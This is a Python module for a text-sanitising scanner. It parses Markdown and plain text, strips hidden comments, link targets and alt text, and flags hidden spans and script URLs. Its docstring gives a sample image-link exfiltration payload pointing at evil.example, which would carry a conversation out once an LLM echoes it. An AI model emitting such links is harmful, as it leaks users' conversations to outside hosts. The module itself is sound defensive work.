"""Markdown and plain text (also CSV, JSON, logs...).

Markdown hides text in HTML comments and `[//]: # (...)` link definitions, and raw HTML can carry hidden spans
or scripts (raw HTML goes through the HTML extractor). Links keep their label only: targets and titles are
dropped (image links are a known exfiltration channel once an LLM echoes them:
`![](https://evil.example/?q={conversation})`); image alt text is dropped too (a loaded image hides it).

The Markdown pass follows CommonMark's block structure first: HTML blocks (a line that starts with a block tag,
<script>, <style>, a comment, ...) are raw HTML up to their end condition and get no Markdown processing at all,
exactly as a renderer leaves them; code spans and fences are recognised only outside raw HTML, scanning left to
right (a tag that starts first wins). Code that holds markup goes through the HTML extractor too, so text a
browser would hide if the same bytes were a web page is never kept."""
from __future__ import annotations

import bisect
import html as htmllib
import re
import uuid

from ..content import content_findings
from ..findings import Finding, Report
from .html import ACTIVE_URL, _decode, scan_html

CONTAINER = r"(?:[ \t]{0,3}(?:>|[-*+]|\d{1,9}[.)])(?:[ \t]+|$))*"     # blockquote / list-item markers
MD_COMMENT = re.compile(r"^" + CONTAINER + r"[ \t]{0,3}\[(?://|comment|_)?[^\]\n]*\]:\s*(?:#|<>)\s*[\"'(](.*?)[\"')]"
                        r"\s*$", re.M)
LABEL = r"((?:[^\[\]]|\[[^\[\]]*\])*)"                          # one level of nested brackets
# [label](target "title"): target bare (one level of parentheses) or <in angle brackets>; title "", '' or ()
LINK = re.compile(r"(!?)\[" + LABEL + r"\]\(\s*(<[^<>\n]*>|(?:[^()\s]|\([^()\s]*\))*)"
                  r"(?:\s+(\"[^\"]*\"|'[^']*'|\([^()]*\)))?\s*\)")
REF_LINK = re.compile(r"(!?)\[" + LABEL + r"\]\[[^\]]*\]")       # [label][ref], ![alt][ref], [label][]
REF_DEF = re.compile(r"^" + CONTAINER + r"[ \t]{0,3}\[[^\]\n]+\]:\s*<?(\S+?)>?(?:\s+[\"'(](.*?)[\"')])?\s*$", re.M)
AUTOLINK = re.compile(r"<([a-zA-Z][a-zA-Z0-9+.-]{1,31}:[^<>\s]*)>")
MARKUP = re.compile(r"<[A-Za-z!?/]")                             # anything an HTML parser would read as markup
TAG_AT = re.compile(r"</?[A-Za-z][A-Za-z0-9-]*(?:\s+[A-Za-z_:][\w.:-]*(?:\s*=\s*(?:[^\s\"'=<>`]+|'[^']*'|\"[^\"]*\"))?)*"
                    r"\s*/?>")
FENCE_OPEN = re.compile(r"^ {0,3}(`{3,}|~{3,})(.*)$")
BLOCK_TAGS = ("address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|"
              "dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|"
              "iframe|legend|li|link|main|menu|menuitem|nav|noframes|ol|optgroup|option|p|param|search|section|"
              "summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul")
HTML_START = [   # CommonMark 4.6: (start, end); end None = runs to a blank line
    (re.compile(r"^ {0,3}<(script|pre|style|textarea)(\s|>|$)", re.I),
     re.compile(r"</(script|pre|style|textarea)>", re.I)),
    (re.compile(r"^ {0,3}<!--"), re.compile(r"-->")),
    (re.compile(r"^ {0,3}<\?"), re.compile(r"\?>")),
    (re.compile(r"^ {0,3}<![A-Za-z]"), re.compile(r">")),
    (re.compile(r"^ {0,3}<!\[CDATA\["), re.compile(r"\]\]>")),
    (re.compile(r"^ {0,3}</?(" + BLOCK_TAGS + r")(\s|/?>|$)", re.I), None),
]
TAG_LINE = re.compile(r"^ {0,3}" + TAG_AT.pattern + r"[ \t]*$")     # type 7: cannot interrupt a paragraph


def scan_text(raw: bytes | str, name: str = "<bytes>", *, markdown: bool = True, base_url: str | None = None,
              fetch_resource=None, ambiguous: bool = False) -> Report:
    """base_url / fetch_resource: as for scan_html, for linked stylesheets in raw HTML.
    ambiguous: no content type said what the bytes are, so they may also be shown as a web page; a line of
    Markdown text that the same bytes read as HTML would hide is then left out too."""
    text = raw if isinstance(raw, str) else _decode(raw)
    text = text.replace("\x00", "")
    rep = Report(path=name, format="markdown" if markdown else "text")
    codes: list[str] = []
    mark = "rgcode" + uuid.uuid4().hex[:12]           # unguessable: the input cannot name a stashed code span

    def stash(s: str) -> str:
        codes.append(s)
        return f"{mark}x{len(codes) - 1}y"

    hidden = []
    if markdown:
        parts = []
        for kind, seg in _segments(text):
            if kind == "html":
                parts.append(seg)
            elif kind == "fence":
                parts.append(stash(seg))
            else:
                seg = _stash_code(seg, stash)
                hidden += [("markdown_comment", m.group(1)) for m in MD_COMMENT.finditer(seg)]
                seg = MD_COMMENT.sub("", seg)
                parts.append(_links(rep, seg))
        work = "".join(parts)
    else:
        work = text

    if MARKUP.search(work):
        sub = scan_html(work, name, base_url=base_url, fetch_resource=fetch_resource)
        if sub.error:                                  # a linked stylesheet is missing: the page is a reject
            rep.error = sub.error
            return rep
        rep.findings += [f for f in sub.findings if "visible text" not in f.message]
        visible = sub.safe_text
    else:
        visible = work
    visible = re.sub(re.escape(mark) + r"x(\d+)y", lambda m: _code_text(codes[int(m.group(1))]), visible)
    if markdown and ambiguous and MARKUP.search(text):
        visible = _drop_hidden_as_html(visible, text, name, base_url, fetch_resource, rep)
        if rep.error:
            return rep

    for ch, t in hidden:
        rep.findings += content_findings(t, ch, side_channel=len(t.strip()) >= 40)

    rep.safe_pages = [visible]
    rep.findings += content_findings(visible, "visible text")
    return rep


def _drop_hidden_as_html(visible, text, name, base_url, fetch_resource, rep) -> str:
    """Read as a web page, these bytes hide some text: drop every line of the Markdown reading that only that
    hidden text contains (whitespace-normalised, 3+ letters or digits)."""
    as_html = scan_html(text, name, base_url=base_url, fetch_resource=fetch_resource)
    if as_html.error:
        rep.error = as_html.error
        return ""
    hidden = " ".join(" ".join(t.split()) for t in getattr(as_html, "hidden_texts", []))
    shown = " ".join(as_html.safe_text.split())
    if not hidden:
        return visible
    out, dropped = [], 0
    for line in visible.split("\n"):
        norm = " ".join(line.split())
        if sum(c.isalnum() for c in norm) >= 3 and norm in hidden and norm not in shown:
            dropped += 1
            continue
        out.append(line)
    if dropped:
        rep.findings.append(Finding("hidden_text", f"hidden text (hidden_as_html): {dropped} line(s) that the same "
                                                   "bytes hide when shown as a web page"))
    return "\n".join(out)


def _code_text(code: str) -> str:
    """A stashed code span or fence, as shown. Markup inside it goes through the HTML extractor on its own: the
    same bytes may be a web page (no content type), and there that markup is live."""
    if not MARKUP.search(code):
        return code
    return scan_html(code, "<code>").safe_text.strip() + ("\n" if code.endswith("\n") else "")


_CONTAINER = re.compile(r"^" + CONTAINER)


def _container_body(line: str) -> str:
    return _CONTAINER.sub("", line, count=1) if line[:1] in " \t>-*+0123456789" else line


def _segments(text: str) -> list[tuple[str, str]]:
    """Split Markdown into ("md" | "html" | "fence", text) by CommonMark's block rules (approximate: container
    markers are skipped when looking for a block start)."""
    lines = text.splitlines(keepends=True)
    out: list[tuple[str, str]] = []
    md: list[str] = []
    i, para = 0, False

    def flush():
        if md:
            out.append(("md", "".join(md)))
            md.clear()

    while i < len(lines):
        body = _container_body(lines[i].rstrip("\r\n"))
        lead = body.lstrip(" ")[:1]
        if lead not in ("<", "`", "~"):                 # the common case: plain Markdown
            md.append(lines[i])
            para = bool(body.strip())
            i += 1
            continue
        fm = FENCE_OPEN.match(body)
        if fm and not (fm.group(1)[0] == "`" and "`" in fm.group(2)):
            ch, n = fm.group(1)[0], len(fm.group(1))
            close = re.compile(r"^ {0,3}" + re.escape(ch) + "{" + str(n) + r",}[ \t]*$")
            j = i + 1
            while j < len(lines) and not close.match(_container_body(lines[j].rstrip("\r\n"))):
                j += 1
            flush()
            out.append(("fence", "".join(lines[i:j + 1])))
            i, para = j + 1, False
            continue
        end = _html_block_end(lines, i, body, para) if lead == "<" else None
        if end is not None:
            flush()
            out.append(("html", "".join(lines[i:end])))
            i, para = end, False
            continue
        md.append(lines[i])
        para = bool(body.strip())
        i += 1
    flush()
    return out


def _html_block_end(lines, i, body, para) -> int | None:
    """Index after the last line of the HTML block starting at line i, or None when no block starts there."""
    for start, end in HTML_START:
        if start.match(body):
            break
    else:
        if para or not TAG_LINE.match(body):
            return None
        start, end = None, None
    if end is None:                                     # types 6 and 7: up to a blank line
        j = i + 1
        while j < len(lines) and _container_body(lines[j]).strip():
            j += 1
        return j
    m = start.match(body)
    j = i
    rest = body[m.end():]
    while not end.search(rest):
        j += 1
        if j >= len(lines):
            return len(lines)
        rest = lines[j]
    return j + 1


_NEXT = re.compile(r"[<`]")


def _stash_code(s: str, stash) -> str:
    """Replace code spans by stash markers, scanning left to right: raw HTML (a tag, comment, processing
    instruction, declaration, CDATA) that starts first is skipped whole, so backticks inside a tag stay put."""
    runs: dict[int, list[int]] = {}
    for m in re.finditer(r"`+", s):
        runs.setdefault(len(m.group()), []).append(m.start())
    out, i = [], 0
    while True:
        m = _NEXT.search(s, i)
        if m is None:
            out.append(s[i:])
            return "".join(out)
        j = m.start()
        if s[j] == "<":
            k = _raw_html_end(s, j)
            out.append(s[i:k])
            i = k
            continue
        n = len(re.match(r"`+", s[j:]).group())
        starts = runs.get(n, [])
        p = bisect.bisect_right(starts, j)
        if p < len(starts):
            close = starts[p] + n
            out.append(s[i:j] + stash(s[j:close]))
            i = close
        else:
            out.append(s[i:j + n])
            i = j + n


def _raw_html_end(s: str, j: int) -> int:
    for opener, closer in (("<!--", "-->"), ("<![CDATA[", "]]>"), ("<?", "?>")):
        if s.startswith(opener, j):
            k = s.find(closer, j + len(opener))
            return len(s) if k < 0 else k + len(closer)
    if re.match(r"<![A-Za-z]", s[j:j + 3]):
        k = s.find(">", j)
        return len(s) if k < 0 else k + 1
    m = TAG_AT.match(s, j)
    return m.end() if m else j + 1


def _links(rep: Report, s: str) -> str:
    """Links keep their label, images lose their alt text; targets and titles go (and are checked)."""
    def one(m):
        bang, label, url, title = m.groups()
        title = (title or "")[1:-1]
        if re.search(r"<[A-Za-z/!?]", title):          # markup in a title: leave it for the HTML extractor
            return m.group(0)
        _link(rep, url.strip("<>"), title)
        if bang:
            rep.findings += content_findings(label, "image alt text")   # not shown once the image loads
            return ""
        return label

    for _ in range(4):                                  # nested: [![badge](img)](link)
        new = LINK.sub(one, s)
        if new == s:
            break
        s = new
    for url, title in REF_DEF.findall(s):
        _link(rep, url, title)
    for m in AUTOLINK.finditer(s):
        _link(rep, m.group(1), "")
    s = REF_DEF.sub("", s)
    return REF_LINK.sub(lambda m: "" if m.group(1) else m.group(2), s)


def _link(rep, url, title):
    """Findings for a link whose target and title are dropped from safe_text (the label stays, as visible text)."""
    low = htmllib.unescape(re.sub(r"\\(.)", r"\1", url)).strip().lower()     # as CommonMark decodes it
    if re.sub(r"[\s\x00-\x1f]", "", low).startswith(ACTIVE_URL):
        rep.findings.append(Finding(check="javascript_url", message="link runs script or loads an inline document"))
        return
    if title:
        rep.findings += content_findings(title, "link title", side_channel=True)
